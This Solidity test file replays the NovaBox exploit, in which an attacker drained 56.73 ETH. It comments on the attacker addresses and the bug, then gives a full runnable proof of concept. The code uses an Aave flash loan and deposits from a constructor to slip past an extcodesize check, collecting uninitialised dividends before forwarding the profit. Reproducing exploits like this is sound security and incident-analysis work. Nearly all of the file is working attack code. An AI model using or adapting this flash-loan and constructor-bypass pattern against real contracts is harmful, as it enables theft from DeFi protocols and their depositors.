// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 56.73 ETH
// Attacker : 0x3690c5efc63eea1167c4d92a3f2dd8afdb85c294
// Attack Contract : 0xb50be385f6eb02ae379da3d3a1bb58a0dc260858
// Vulnerable Contract : 0xbc4191167d4b0251cab5201a527daa8a7d3846b0
// Victim : 0xbc4191167d4b0251cab5201a527daa8a7d3846b0
// Attack Tx : https://etherscan.io/tx/0x0cfa357e9e4db1540246f17cb6bfa0634ff8727d7cf241b63fb22605021c8844

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xbc4191167d4b0251cab5201a527daa8a7d3846b0#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2064616360466919793
//
// NovaBox blocks contract ETH deposits with extcodesize(msg.sender) == 0 and adds new dual ETH/NOVA depositors to the
// dividend list without initializing their dividend checkpoints. The attacker deposits through a constructor helper,
// joins the list with zero checkpoints, then immediately withdraws ETH and receives stale historical ETH dividends.

address constant ATTACKER = 0x3690c5EFc63eeA1167c4d92a3f2dD8afdb85C294;
address constant ATTACK_CONTRACT = 0xB50bE385f6EB02aE379DA3D3A1BB58a0dc260858;
address constant VULNERABLE_CONTRACT = 0xbc4191167D4B0251cAB5201a527Daa8a7d3846b0;
address constant NOVA = 0x72FBc0fc1446f5AcCC1B083F0852a7ef70a8ec9f;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

interface INovaToken {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

interface INovaBox {
    function depositTokens(
        address randomAddr,
        uint256 randomTicket
    ) external;
    function contributionsEth(
        address account
    ) external view returns (uint256);
    function withdrawEth(
        uint256 amount
    ) external;
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(
        uint256 amount
    ) external;
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 25_281_767);
        fundingToken = address(0);

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(VULNERABLE_CONTRACT, "NovaBox");
        vm.label(NOVA, "NOVA");
        vm.label(WETH, "WETH");
        vm.label(AAVE_V3_POOL, "Aave V3 Pool");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256 profitBefore = ATTACKER.balance;
        uint256 sameBlockNovaSeed = 0.001 ether;
        uint256 flashAmount = 427.5 ether;
        uint256 expectedMinimumProfit = 50 ether;

        NovaBoxRoot root = new NovaBoxRoot(payable(ATTACKER), flashAmount);
        vm.label(address(root), "Local Root Attack");

        // step 1: model same-block tx index 0, which seeded the future root contract with 0.001 NOVA.
        deal(NOVA, address(root), sameBlockNovaSeed);
        assertEq(INovaToken(NOVA).balanceOf(address(root)), sameBlockNovaSeed);

        // step 2: execute the trace order: local receiver, Aave flash loan, constructor helper, then profit forwarding.
        root.run();

        uint256 profit = ATTACKER.balance - profitBefore;
        emit log_named_decimal_uint("ETH profit after Aave repayment", profit, 18);
        assertGt(profit, expectedMinimumProfit);
    }
}

contract NovaBoxRoot {
    INovaToken private constant nova = INovaToken(NOVA);
    address payable private immutable profitReceiver;
    uint256 private immutable flashAmount;

    constructor(
        address payable profitReceiver_,
        uint256 flashAmount_
    ) {
        profitReceiver = profitReceiver_;
        flashAmount = flashAmount_;
    }

    function run() external {
        NovaFlashLoanReceiver receiver = new NovaFlashLoanReceiver(address(this), flashAmount);
        uint256 novaSeed = nova.balanceOf(address(this));
        require(nova.transfer(address(receiver), novaSeed), "nova seed transfer failed");

        receiver.startFlashLoan();

        profitReceiver.transfer(address(this).balance);
    }

    receive() external payable {}
}

contract NovaFlashLoanReceiver {
    INovaToken private constant nova = INovaToken(NOVA);
    IAaveV3Pool private constant aave = IAaveV3Pool(AAVE_V3_POOL);
    IWETH9 private constant weth = IWETH9(WETH);

    address payable private immutable root;
    uint256 private immutable flashAmount;

    constructor(
        address root_,
        uint256 flashAmount_
    ) {
        root = payable(root_);
        flashAmount = flashAmount_;
    }

    function startFlashLoan() external {
        aave.flashLoanSimple(address(this), WETH, flashAmount, "", 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == AAVE_V3_POOL, "unexpected lender");
        require(asset == WETH, "unexpected asset");
        require(initiator == address(this), "unexpected initiator");
        require(amount == flashAmount, "unexpected amount");

        // step 3: unwrap the flash-loaned WETH and spend the ETH through a constructor helper.
        weth.withdraw(amount);
        new NovaConstructorHelper{value: amount}(address(this));

        // step 4: wrap enough ETH to repay Aave principal plus premium, then forward the remaining ETH profit.
        uint256 repayment = amount + premium;
        weth.deposit{value: repayment}();
        weth.approve(AAVE_V3_POOL, repayment);

        root.transfer(address(this).balance);
        return true;
    }

    function fundHelperWithNova() external {
        uint256 balance = nova.balanceOf(address(this));
        require(nova.transfer(msg.sender, balance), "helper nova transfer failed");
    }

    receive() external payable {}
}

contract NovaConstructorHelper {
    INovaToken private constant nova = INovaToken(NOVA);
    INovaBox private constant box = INovaBox(VULNERABLE_CONTRACT);

    constructor(
        address flashLoanReceiver
    ) payable {
        // step 5: pull the NOVA seed from the flash-loan receiver and enter NovaBox as a token contributor.
        NovaFlashLoanReceiver(payable(flashLoanReceiver)).fundHelperWithNova();
        uint256 novaBalance = nova.balanceOf(address(this));
        require(nova.approve(VULNERABLE_CONTRACT, novaBalance), "nova approve failed");
        box.depositTokens(address(this), 0);

        // step 6: deposit ETH while this contract has no runtime code, bypassing NovaBox's extcodesize check.
        (bool deposited,) = VULNERABLE_CONTRACT.call{value: msg.value}("");
        require(deposited, "eth deposit failed");

        // step 7: withdraw the credited ETH and stale dividends, then return all ETH to the flash-loan receiver.
        uint256 creditedEth = box.contributionsEth(address(this));
        box.withdrawEth(creditedEth);

        payable(flashLoanReceiver).transfer(address(this).balance);
    }
}
